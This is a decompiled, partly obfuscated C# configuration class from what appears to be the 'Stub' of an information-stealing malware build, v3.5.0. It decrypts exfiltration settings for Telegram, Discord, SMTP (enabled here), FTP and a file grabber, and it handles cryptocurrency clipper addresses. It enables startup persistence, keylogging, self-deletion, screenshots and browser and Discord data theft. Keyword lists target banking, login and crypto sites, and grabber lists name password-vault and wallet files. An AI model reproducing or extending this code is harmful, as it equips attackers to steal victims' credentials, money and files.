using System;
using System.Collections.Generic;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000019 RID: 25
	public static class Config
	{
		// Token: 0x0600007C RID: 124 RVA: 0x000091D8 File Offset: 0x000073D8
		public static void InitAsync()
		{
			if (Config.TelegramCheckBox == "1")
			{
				Logging.Log("Config: Begin Decrypting Telegram details", true);
				Config.TelegramAPI = StringsCrypt.DecryptConfig(Config.TelegramAPI);
				Logging.Log("TelegramAPI Decrypted: '" + Config.TelegramAPI + "'", true);
				Config.TelegramID = StringsCrypt.DecryptConfig(Config.TelegramID);
				Logging.Log("TelegramID Decrypted: '" + Config.TelegramID + "'", true);
			}
			if (Config.DiscordCheckBox == "1")
			{
				Logging.Log("Config: Begin Decrypting Discord details", true);
				Config.DiscordWebhook = StringsCrypt.DecryptConfig(Config.DiscordWebhook);
				Logging.Log("Discord Webhook Decrypted: '" + Config.DiscordWebhook + "'", true);
			}
			if (Config.SmtpCheckBox == "1")
			{
				Logging.Log("Config: Begin Decrypting Smtp details", true);
				Config.SmtpServer = StringsCrypt.DecryptConfig(Config.SmtpServer);
				Logging.Log("SmtpServer Decrypted: '" + Config.SmtpServer + "'", true);
				Config.SmtpSender = StringsCrypt.DecryptConfig(Config.SmtpSender);
				Logging.Log("SmtpSender Decrypted: '" + Config.SmtpSender + "'", true);
				Config.SmtpPassword = StringsCrypt.DecryptConfig(Config.SmtpPassword);
				Logging.Log("SmtpPassword Decrypted: ' " + Config.SmtpPassword + " '", true);
				Config.SmtpReceiver = StringsCrypt.DecryptConfig(Config.SmtpReceiver);
				Logging.Log("SmtpReceiver: ' " + Config.SmtpReceiver + " '", true);
			}
			if (Config.FtpCheckBox == "1")
			{
				Logging.Log("Config: Begin Decrypting Ftp details", true);
				Config.FtpHost = StringsCrypt.DecryptConfig(Config.FtpHost);
				Logging.Log("FtpHost Decrypted: ' " + Config.FtpHost + " '", true);
				Config.FtpUser = StringsCrypt.DecryptConfig(Config.FtpUser);
				Logging.Log("FtpUser Decrypted: '" + Config.FtpUser + "'", true);
				Config.FtpPass = StringsCrypt.DecryptConfig(Config.FtpPass);
				Logging.Log("FtpPass Decrypted: '" + Config.FtpPass + "'", true);
			}
			if (Config.FileDownloader == "1")
			{
				Logging.Log("Config: Begin Decrypting Downloader details", true);
				Config.Downloader = StringsCrypt.DecryptConfig(Config.Downloader);
				Logging.Log("Downloader Decrypted: '" + Config.Downloader + "'", true);
			}
			if (Config.FileGrabberCheckBox == "1")
			{
				Logging.Log("Config: Begin Decrypting Grabber details", true);
				Config.GrabberHost = StringsCrypt.DecryptConfig(Config.GrabberHost);
				Logging.Log("GrabberHost Decrypted: '" + Config.GrabberHost + "'", true);
				Config.GrabberUser = StringsCrypt.DecryptConfig(Config.GrabberUser);
				Logging.Log("GrabberUser Decrypted: '" + Config.GrabberUser + "'", true);
				Config.GrabberPass = StringsCrypt.DecryptConfig(Config.GrabberPass);
				Logging.Log("GrabberPass Decrypted: ' " + Config.GrabberPass + " '", true);
			}
			if (Config.ClipperCheckBox == "1")
			{
				Logging.Log("Config: Decrypting clipper addresses...", true);
				Config.ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["btc"]);
				Config.ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["eth"]);
				Config.ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["ltc"]);
				Config.ClipperAddresses["bch"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["bch"]);
				Config.ClipperAddresses["xmr"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["xmr"]);
				Config.ClipperAddresses["trx"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["trx"]);
				Config.ClipperAddresses["sol"] = StringsCrypt.DecryptConfig(Config.ClipperAddresses["sol"]);
				Logging.Log("Config: Clipper addresses decrypted successfully", true);
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x0000960C File Offset: 0x0000780C
		static Config()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			Config.Version = "v3.5.0";
			Config.TelegramCheckBox = "0";
			Config.TelegramAPI = "ENCRYPTED:5x6bc7DjDNWlu6DqQB5lKQ==";
			Config.TelegramID = "ENCRYPTED:5x6bc7DjDNWlu6DqQB5lKQ==";
			Config.DiscordCheckBox = "0";
			Config.DiscordWebhook = "ENCRYPTED:5x6bc7DjDNWlu6DqQB5lKQ==";
			Config.SmtpCheckBox = "1";
			Config.SmtpServer = "ENCRYPTED:0j764gzY6FWG3RNOsIgL3klJ7ZgEUi3nAR/hvee+Fr4=";
			Config.SmtpSender = "ENCRYPTED:N7PwTsT2C/ZUSbIjk1tDgA+G/T4p6C0v3eqvFeGVdEY=";
			Config.SmtpPassword = "ENCRYPTED:Q9pNUriiia8YVz6LS3wUYw==";
			Config.SmtpPort = "25";
			Config.SmtpReceiver = "ENCRYPTED:lLMhfUZr/691y2Rwo+D0OZD6ASUEQ7CNSGh4GZlPx2E=";
			Config.CbEnableSsl = "0";
			Config.FtpCheckBox = "0";
			Config.FtpHost = "ENCRYPTED:5x6bc7DjDNWlu6DqQB5lKQ==";
			Config.FtpUser = "ENCRYPTED:5x6bc7DjDNWlu6DqQB5lKQ==";
			Config.FtpPass = "ENCRYPTED:5x6bc7DjDNWlu6DqQB5lKQ==";
			Config.Debug = "1";
			Config.AntiAnalysis = "0";
			Config.Startup = "1";
			Config.StartDelay = "0";
			Config.Keylogger = "1";
			Config.Melt = "1";
			Config.Screenshot = "1";
			Config.Clipboard = "0";
			Config.ChromiumBrowser = "1";
			Config.GeckoBrowser = "1";
			Config.BrowserWallets = "0";
			Config.OutlookDesktopApp = "0";
			Config.FoxMailApp = "0";
			Config.Discord = "1";
			Config.Telegram = "0";
			Config.WinScp = "0";
			Config.DesktopWallets = "0";
			Config.FileZilla = "0";
			Config.Wifi = "0";
			Config.FileGrabberCheckBox = "0";
			Config.GrabberHost = "";
			Config.GrabberUser = "";
			Config.GrabberPass = "";
			Config.ClipperCheckBox = "0";
			Config.FileDownloader = "0";
			Config.Downloader = "";
			Config.Mutex = "0MYBS40OAU4OQC15GJX5";
			Config.ClipperAddresses = new Dictionary<string, string>
			{
				{ "btc", "" },
				{ "eth", "" },
				{ "ltc", "" },
				{ "bch", "" },
				{ "xmr", "" },
				{ "trx", "" },
				{ "sol", "" }
			};
			Config.KeyloggerServices = new string[]
			{
				"facebook", "twitter", "chat", "telegram", "skype", "discord", "viber", "message", "gmail", "protonmail",
				"outlook", "email", "password", "encryption", "account", "login", "key", "sign in", "bank", "credit",
				"card", "shop", "buy", "sell"
			};
			Config.BankingServices = new string[] { "qiwi", "money", "exchange", "bank", "credit", "card", "paypal" };
			Config.CryptoServices = new string[]
			{
				"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "btc", "eth", "xmr", "xlm",
				"xrp", "ltc", "bch", "blockchain", "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency", "crypto", "trade",
				"trading", "wallet", "coinomi", "coinbase", "coinmama", "kraken"
			};
			Config.GrabberSizeLimit = 512000;
			Dictionary<string, string[]> dictionary = new Dictionary<string, string[]>();
			dictionary["Document"] = new string[]
			{
				"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
				"json"
			};
			dictionary["DataBase"] = new string[]
			{
				"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
				"dbf", "wallet", "ini"
			};
			dictionary["SourceCode"] = new string[]
			{
				"c", "cs", "sln", "csproj", "cpp", "asm", "sh", "py", "pyw", "html",
				"css", "php", "go", "js", "rb", "pl", "swift", "java", "kt", "kts",
				"ino"
			};
			dictionary["Image"] = new string[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" };
			Config.GrabberFileTypes = dictionary;
		}

		// Token: 0x04000051 RID: 81
		public static string Version;

		// Token: 0x04000052 RID: 82
		public static string TelegramCheckBox;

		// Token: 0x04000053 RID: 83
		public static string TelegramAPI;

		// Token: 0x04000054 RID: 84
		public static string TelegramID;

		// Token: 0x04000055 RID: 85
		public static string DiscordCheckBox;

		// Token: 0x04000056 RID: 86
		public static string DiscordWebhook;

		// Token: 0x04000057 RID: 87
		public static string SmtpCheckBox;

		// Token: 0x04000058 RID: 88
		public static string SmtpServer;

		// Token: 0x04000059 RID: 89
		public static string SmtpSender;

		// Token: 0x0400005A RID: 90
		public static string SmtpPassword;

		// Token: 0x0400005B RID: 91
		public static string SmtpPort;

		// Token: 0x0400005C RID: 92
		public static string SmtpReceiver;

		// Token: 0x0400005D RID: 93
		public static string CbEnableSsl;

		// Token: 0x0400005E RID: 94
		public static string FtpCheckBox;

		// Token: 0x0400005F RID: 95
		public static string FtpHost;

		// Token: 0x04000060 RID: 96
		public static string FtpUser;

		// Token: 0x04000061 RID: 97
		public static string FtpPass;

		// Token: 0x04000062 RID: 98
		public static string Debug;

		// Token: 0x04000063 RID: 99
		public static string AntiAnalysis;

		// Token: 0x04000064 RID: 100
		public static string Startup;

		// Token: 0x04000065 RID: 101
		public static string StartDelay;

		// Token: 0x04000066 RID: 102
		public static string Keylogger;

		// Token: 0x04000067 RID: 103
		public static string Melt;

		// Token: 0x04000068 RID: 104
		public static string Screenshot;

		// Token: 0x04000069 RID: 105
		public static string Clipboard;

		// Token: 0x0400006A RID: 106
		public static string ChromiumBrowser;

		// Token: 0x0400006B RID: 107
		public static string GeckoBrowser;

		// Token: 0x0400006C RID: 108
		public static string BrowserWallets;

		// Token: 0x0400006D RID: 109
		public static string OutlookDesktopApp;

		// Token: 0x0400006E RID: 110
		public static string FoxMailApp;

		// Token: 0x0400006F RID: 111
		public static string Discord;

		// Token: 0x04000070 RID: 112
		public static string Telegram;

		// Token: 0x04000071 RID: 113
		public static string WinScp;

		// Token: 0x04000072 RID: 114
		public static string DesktopWallets;

		// Token: 0x04000073 RID: 115
		public static string FileZilla;

		// Token: 0x04000074 RID: 116
		public static string Wifi;

		// Token: 0x04000075 RID: 117
		public static string FileGrabberCheckBox;

		// Token: 0x04000076 RID: 118
		public static string GrabberHost;

		// Token: 0x04000077 RID: 119
		public static string GrabberUser;

		// Token: 0x04000078 RID: 120
		public static string GrabberPass;

		// Token: 0x04000079 RID: 121
		public static string ClipperCheckBox;

		// Token: 0x0400007A RID: 122
		public static string FileDownloader;

		// Token: 0x0400007B RID: 123
		public static string Downloader;

		// Token: 0x0400007C RID: 124
		public static string Mutex;

		// Token: 0x0400007D RID: 125
		public static Dictionary<string, string> ClipperAddresses;

		// Token: 0x0400007E RID: 126
		public static string[] KeyloggerServices;

		// Token: 0x0400007F RID: 127
		public static string[] BankingServices;

		// Token: 0x04000080 RID: 128
		public static string[] CryptoServices;

		// Token: 0x04000081 RID: 129
		public static int GrabberSizeLimit;

		// Token: 0x04000082 RID: 130
		public static Dictionary<string, string[]> GrabberFileTypes;
	}
}
